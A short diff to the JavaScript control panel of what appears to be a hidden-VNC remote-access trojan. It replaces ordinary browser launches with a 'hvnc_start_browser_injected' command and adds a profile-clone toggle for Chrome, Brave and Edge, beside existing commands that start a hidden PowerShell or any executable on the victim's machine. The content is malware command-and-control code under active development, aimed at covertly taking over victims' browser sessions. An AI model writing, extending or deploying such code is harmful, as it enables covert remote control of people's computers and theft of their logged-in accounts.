@@ -746,11 +746,14 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
         } else if (action === "start-powershell") {
           sendCmd("hvnc_start_process", { path: "conhost powershell.exe" });
         } else if (action === "start-chrome") {
-          sendCmd("hvnc_start_process", { path: "c:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" });
+          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "chrome", clone });
         } else if (action === "start-brave") {
-          sendCmd("hvnc_start_process", { path: "c:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" });
+          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "brave", clone });
         } else if (action === "start-edge") {
-          sendCmd("hvnc_start_process", { path: "c:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" });
+          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "edge", clone });
         } else if (action === "start-custom") {
           const exePath = prompt("Enter exe path (required)");
           if (!exePath) {
